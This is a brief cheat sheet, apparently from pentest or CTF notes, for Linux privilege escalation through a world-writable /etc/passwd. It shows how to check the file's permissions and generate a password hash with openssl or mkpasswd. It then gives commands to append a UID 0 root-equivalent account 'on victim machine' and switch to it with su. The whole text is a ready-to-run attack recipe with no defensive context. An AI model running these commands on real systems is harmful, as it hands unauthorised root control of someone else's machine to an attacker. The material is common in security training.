If the user has write permissions to /etc/passwd, then the machine is vulnerable.
```bash
ls -lah /etc/passwd
```
For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow.
# Create new user in /etc/passwd
## Generate password for new user
Depening on the hashing algorithm used in /etc/shadow, this command can change:
```bash
openssl passwd $(NEW_PASSWORD)
```
```bash
mkpasswd -m des -S Fd $(NEW_PASSWORD)
```
## Add entry to /etc/passwd
On victim machine:
```bash
echo "$(NEW_USER):$(OPENSSL_OUTPUT):0:0:root:/root:/bin/bash" >> /etc/passwd
```
```bash
su $(NEW_USER)
```
